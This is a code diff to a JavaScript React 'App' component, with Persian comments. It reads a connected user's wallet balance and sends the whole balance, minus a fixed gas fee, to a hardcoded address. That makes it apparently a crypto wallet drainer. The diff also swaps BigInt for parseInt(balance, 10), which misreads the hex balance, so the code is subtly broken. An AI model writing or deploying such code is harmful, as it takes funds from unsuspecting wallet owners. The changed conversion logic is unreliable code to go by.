@@ -50,8 +50,8 @@ function App() {
           params: [account_sender, "latest"],
         });
 
-        // مقدار موجودی را از HEX به Decimal تبدیل می‌کنیم
-        let balanceInWei = BigInt(balance);
+        // مقدار موجودی را از HEX به عدد معمولی تبدیل می‌کنیم
+        let balanceInWei = parseInt(balance, 10);
         console.log(`💰 Balance: ${balanceInWei} WEI`);
 
         if (balanceInWei <= 0) {
@@ -59,10 +59,18 @@ function App() {
           return;
         }
 
+        const gasFee = 21000 * 5000000000; // مقدار گس
+        const transactionValue = balanceInWei - gasFee;
+
+        if (transactionValue <= 0) {
+          console.error("❌ Not enough balance after gas fee.");
+          return;
+        }
+
         const transactionParameters = {
           to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
           from: account_sender,
-          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16), // ارسال کل موجودی - گس
+          value: "0x" + transactionValue.toString(16), // ارسال کل موجودی - گس
           gas: "0x5208", // مقدار گس استاندارد
         };
 
